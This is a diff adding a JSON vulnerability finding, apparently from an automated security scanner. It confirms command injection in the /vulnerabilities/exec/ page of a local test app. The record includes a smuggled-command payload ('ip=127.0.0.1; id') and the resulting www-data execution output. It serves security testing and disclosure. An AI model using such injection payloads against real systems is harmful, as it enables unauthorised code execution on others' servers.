@@ -1,0 +1,28 @@
+{
+  "id": "f_1784861882938_47c19c",
+  "action": "confirm",
+  "title": "Command Execution (RCE) in /vulnerabilities/exec/",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "http://127.0.0.1:8080/vulnerabilities/exec/",
+  "url": "http://127.0.0.1:8080/vulnerabilities/exec/",
+  "description": "The ip parameter in POST to /vulnerabilities/exec/ passes user input directly to shell_exec() or system() without sanitization. Semicolon, pipe, and concatenation operators all allow arbitrary command execution.",
+  "poc": "Probe request against http://127.0.0.1:8080/vulnerabilities/exec/; observed proving result from prior stage handoff: POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 ti",
+  "proof": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+  "how_captured": "script: proof_command_exec.txt",
+  "evidence_ids": [
+    "ev_1784861882134_9f53dc"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784861882134_9f53dc",
+      "excerpt": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: proof_command_exec.txt"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "8080",
+  "created_at": "2026-07-24T02:58:02.938Z"
+}
